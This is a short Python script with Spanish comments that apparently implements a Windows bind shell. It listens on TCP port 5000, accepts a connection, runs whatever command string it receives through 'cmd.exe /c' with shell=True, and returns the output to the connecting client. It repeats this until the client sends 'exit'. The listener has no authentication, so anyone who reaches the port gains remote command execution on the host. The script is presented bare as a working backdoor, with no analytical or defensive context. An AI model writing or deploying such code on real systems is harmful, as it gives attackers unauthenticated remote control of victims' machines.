import socket
import subprocess

#Colocar ip entre las comillas

server_address = ('', 5000)

while True:
    
    server_socket = socket.socket()
    server_socket.bind(server_address)
    server_socket.listen(1)

    client_socket, client_addres = server_socket.accept()
    comando = client_socket.recv(4096).decode()

    if comando == 'exit':
        client_socket.close()
        break

    result = subprocess.run(f"cmd.exe /c {comando}", shell=True, capture_output=True, text=True)
    salida = result.stdout
    client_socket.send(salida.encode())
    
    client_socket.close()
    server_socket.close()
